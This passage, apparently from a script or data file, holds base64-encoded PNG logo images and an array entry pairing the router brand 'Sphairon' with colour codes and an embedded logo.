ZrBqM/7jBEUskkB0GrA7D1m6mnj4lwCoY75zsQzy6RompkD9qopazsKpJh9G/iZCxyPXg/iUfJ83UqicN/BYW5lMepDcZUuOxMG9qV44dSvKCoN2WCrMavsUqVABxdMpR/gwljUG1ZMheQoQ7BmlOT2ofpmmKuN6RU/Equ+iPvkKoosphgHl2ZMG+W/i4e25jZaI8eOg6U5KrKWoei+ZNC+v8//vLB7+NtHkG6jeSKErTQbnPVRqaQoP8vuTMTSHX97pm3sSTdqgFvBpVA9FRm9PCbJ4wUAARXES47E0RsEaqvZuBPLfJihXFJEZxCOFPUNtCv+RurYTsOQuCtXtOjfeRfU8mnz8vYnhe1V67jPt0t4HRYwTq4MRqFj4ZuqTzyN6F4VNUB8AeRknXZN1rXztQouFOxz5pFE2IDoSlQmM2ePjNBy/PaPFUcvsTRGPNCNyCcVZL1xEyNeJhc17FfpJc/U/2ND1eZTLgM5Ch5MR5UGE4/u9eHM8JBia7gAbz34ZeM7Yr8tT/SXhZkeAQ5GawkuxUp+mGJufiLSwtee47BuF6CvsOXzn2cadxMMLeyvI7mftph3vBUSOMd/BxcJxhNmURLA/HOBrOzy+FQMLp6ZpivyctHUMIi0U1wXJRhSbpnBlb3cbv/EiJF6bI5iv1yxa+Xuh8eyXiYdPR/Vi4NVAfWWFvIxwHrHwubnlTEqCEOdl/HFP6HuIXvV+ow+3/+VJ3h5hY5FG0EvIf6J0MdODciHxyE2FDiQj86teIRY+F0JHAbcAmwoYzVpErmZr6lCaIk0D35I7PcAGw6/NxhGK9TsPfjcgHhLTRTeZ+7ayTLYXpan6dkZ0HQVyOYURwtcQrmCI9TFikdynOo7YfDvKl5l179h+f37b5LcQ4ugWN4ewO3UtSMyffCA7cQZwN0V7lpA3NiPUEot0FDqQnLh00T6kKi5AtRqYQPDJst2gK1DuZOOWBabzHEoERG1LBXsNq0WYDlQS3Fl/GliJaiMHfmiRe+vugfq2CVjyE9Khs2ie/BrR9knEqpa8//PalgpGDZuMsi8W5zF6jzP9S4iMJo5whxozzjebuxevYDGVxsijhQ7EE/ayPdGu07DkzN7ZyMcAFR6tpoAXgEcRkoS6ljB3avGeQ5bYTl3HQVjpScCpwBeBMR4tvgmsAm3H0cU017zhOca+RNsnoc5NwE1sTf16h8foutZPItZ3EMoYErqImye/629GuL1sT9jyG6DKV7vFjkorZVzMvPCGQofiO/bqckJrP0oqNBaLQ1Adg7I/yGhER7z/OhVFdCNuT8JOkPeAF0CfZEjoqaxbwJcobma3H0BKx6N6OCKHgB6E++Q3Aun9oFS24h6rbAZeRngFR1+hzHqMeeGXAo/x0kX7kCq/AmUK7h1FF7APwjPALcQiiW0vDaAkRoX6xCWI/B8Dj7P8ILAV5BvEq36etwqPEiVKZM/0FUNh49BMFyrB1QTWtR1KSJpRKgPzUVB0NZbaNNY8VuhISpQoYUbARdEq2O2zQH+El7F3xcW7wLfY0DXPsLSpRIkSRUJ+ukK4cwSuBmYDw/Li038UWEDKuYJba9YVOpgSJUp4J79tcezEh1H9b0T+H7uPEG4B4jj6M0/Dy0uUKFF0FKYv2CXJj5J25oBciNtZuBjpBn4FoR8Rn+ylE3GJEiWKlMI2RqxtCbHX8ImI2rizRwrdmUKB+0HijNiczDj4p0SJEh8IiqczbH3bx7HkbByZhOgJZNOu3x8UeBKhHeWO3Ga2lihRYnemeASwL9Pv3YshZaf1iuEXgcPxL1YF/g66ApEH2Bp6gNsmv+WT7RIlSuxGFKcA7oy9bE+sLcfhcDju9LGxqByA6GjcwT99a1c3A50InWhvUbjyHJY+jeizONZz7rS7EiVK/Kfz/wFexURvhK+bFwAAAABJRU5ErkJggg=='
										["Sphairon"]='#F2F2F2 #599BD7 #222222 data:image/png;base64,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